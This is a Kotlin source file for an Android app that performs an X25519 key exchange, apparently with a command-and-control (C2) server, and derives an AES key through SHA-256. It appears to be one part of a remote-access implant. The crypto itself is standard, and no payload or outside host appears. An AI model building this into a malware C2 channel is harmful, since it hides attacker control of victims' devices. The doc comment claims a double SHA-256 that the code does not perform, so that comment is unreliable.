// ============================================================
// FILE: android/app/src/main/java/com/xrc/core/crypto/KeyExchanger.kt
// ============================================================
package com.xrc.core.crypto

import android.util.Base64
import java.security.*
import java.security.spec.PKCS8EncodedKeySpec
import java.security.spec.X509EncodedKeySpec
import javax.crypto.KeyAgreement

/**
 * KeyExchanger — ECDH (X25519) key exchange with C2 server.
 *
 * Generates an ephemeral X25519 keypair for each session.
 * Performs ECDH with the C2's public key to derive a shared secret.
 * The shared secret is then used as the AES-256-GCM key via SHA-256.
 */
class KeyExchanger {

    companion object {
        private const val ALGORITHM = "X25519"
        private const val KEY_AGREEMENT = "XDH"
        private const val KEY_DERIVATION = "SHA-256"

        /**
         * Generate a new X25519 keypair.
         */
        fun generateKeyPair(): KeyPair {
            val keyPairGen = KeyPairGenerator.getInstance(ALGORITHM)
            return keyPairGen.generateKeyPair()
        }

        /**
         * Encode a public key to Base64.
         */
        fun encodePublicKey(publicKey: PublicKey): String {
            return Base64.encodeToString(publicKey.encoded, Base64.NO_WRAP)
        }

        /**
         * Decode a Base64-encoded public key.
         */
        fun decodePublicKey(encoded: String): PublicKey {
            val keyBytes = Base64.decode(encoded, Base64.NO_WRAP)
            val keySpec = X509EncodedKeySpec(keyBytes)
            val keyFactory = KeyFactory.getInstance(ALGORITHM)
            return keyFactory.generatePublic(keySpec)
        }

        /**
         * Perform ECDH key agreement.
         * Returns SHA-256(SHA-256(private, peerPublic)) as the shared secret.
         */
        fun deriveSharedSecret(privateKey: PrivateKey, peerPublicKey: PublicKey): ByteArray {
            val keyAgreement = KeyAgreement.getInstance(KEY_AGREEMENT)
            keyAgreement.init(privateKey)
            keyAgreement.doPhase(peerPublicKey, true)
            val sharedSecret = keyAgreement.generateSecret()

            // Derive AES-256 key via SHA-256
            val digest = MessageDigest.getInstance(KEY_DERIVATION)
            return digest.digest(sharedSecret)
        }
    }
}
